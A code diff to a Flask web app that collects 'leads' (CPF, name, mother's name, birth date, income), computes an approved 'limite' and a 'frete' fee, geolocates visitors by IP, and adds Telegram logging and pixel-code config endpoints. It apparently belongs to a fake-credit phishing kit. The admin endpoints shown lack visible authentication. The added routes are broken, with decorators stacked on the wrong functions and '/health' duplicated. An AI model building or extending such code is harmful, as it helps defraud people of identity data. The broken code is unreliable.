@@ -16,8 +16,8 @@ def generate_qr_b64(data: str) -> str:
         img = qr.make_image(fill_color="black", back_color="white")
         buffered = io.BytesIO()
         try:
-            img.save(buffered, kind="PNG")
-        except TypeError:
+            img.save(buffered, format="PNG")
+        except Exception:
             img.save(buffered)
         return "data:image/png;base64," + base64.b64encode(buffered.getvalue()).decode("utf-8")
     except Exception as e:
@@ -730,25 +730,38 @@ def api_lead():
     limite        = analise["limite"]
     frete         = analise["frete"]
 
+    client_ip = _ip()
+    client_loc = ""
+    try:
+        import requests
+        geo_res = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city", timeout=2)
+        if geo_res.status_code == 200:
+            gd = geo_res.json()
+            if gd.get("status") == "success":
+                client_loc = f"{gd.get('city', '')} - {gd.get('regionName', '')}, {gd.get('country', '')}"
+    except Exception:
+        pass
+        
     db = get_db()
+
     existing = db.execute("SELECT id FROM leads WHERE session_id=?", (sid,)).fetchone()
     if existing:
         db.execute("""
             UPDATE leads SET cpf=?, nome=?, nome_mae=?, data_nasc=?,
                 renda=?, tipo_renda=?, motivo_credito=?, dia_vencimento=?, limite_aprovado=?,
-                utm_source=?, utm_medium=?, utm_campaign=?, utm_content=?, utm_term=?, src=?, sck=?,
+                utm_source=?, utm_medium=?, utm_campaign=?, utm_content=?, utm_term=?, src=?, sck=?, location=?,
                 updated_at=unixepoch()
             WHERE session_id=?
         """, (cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite, 
-              utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, sid))
+              utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, sid))
     else:
         db.execute("""
             INSERT INTO leads(session_id,ip,cpf,nome,nome_mae,data_nasc,
                 renda,tipo_renda,motivo_credito,dia_vencimento,limite_aprovado,
-                utm_source,utm_medium,utm_campaign,utm_content,utm_term,src,sck)
-            VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
-        """, (sid, _ip(), cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite,
-              utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck))
+                utm_source,utm_medium,utm_campaign,utm_content,utm_term,src,sck,location)
+            VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+        """, (sid, client_ip, cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite,
+              utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc))
     db.commit()
 
     return jsonify({
@@ -1507,6 +1520,47 @@ def admin_api_logo():
 #  STATIC / HEALTH / ERRORS
 # ══════════════════════════════════════════════════════════════════════════════
 @app.route("/health")
+@app.route("/api/admin/bot-config", methods=["POST"])
+@app.route("/api/admin/bot-config", methods=["GET"])
+def api_admin_bot_config_get():
+    db = get_db()
+    rows = db.execute("SELECT key, value FROM sys_config WHERE key IN ('telegram_token', 'tg_log_channel', 'tg_log_thread_id')").fetchall()
+    cfg = {r["key"]: r["value"] for r in rows}
+    return jsonify(cfg)
+
+@app.route('/api/admin/bot-config', methods=['POST'])
+def api_admin_bot_config():
+    data = request.get_json()
+    db = get_db()
+    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('telegram_token', ?)", (data.get('token', ''),))
+    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('tg_log_channel', ?)", (data.get('channel', ''),))
+    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('tg_log_thread_id', ?)", (data.get('topic', ''),))
+    db.commit()
+    return jsonify({"ok": True})
+
+
+@app.route('/health')
+
+@app.route("/api/admin/advanced-config", methods=["POST"])
+def api_admin_advanced_config():
+    data = request.get_json()
+    db = get_db()
+    
+    # Save generic configs
+    for key in ['mgr_name', 'mgr_years', 'mgr_avatar', 'favicon', 'pixel_code']:
+        if key in data:
+            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (key, data[key]))
+            
+    db.commit()
+    return jsonify({"ok": True})
+
+@app.route("/api/config", methods=["GET"])
+def api_get_public_config():
+    db = get_db()
+    rows = db.execute("SELECT key, value FROM sys_config WHERE key IN ('mgr_name', 'mgr_years', 'mgr_avatar', 'favicon', 'pixel_code')").fetchall()
+    return jsonify({r["key"]: r["value"] for r in rows})
+
+@app.route('/health')
 def health():
     return jsonify({"ok": True, "ts": time.time()})
 
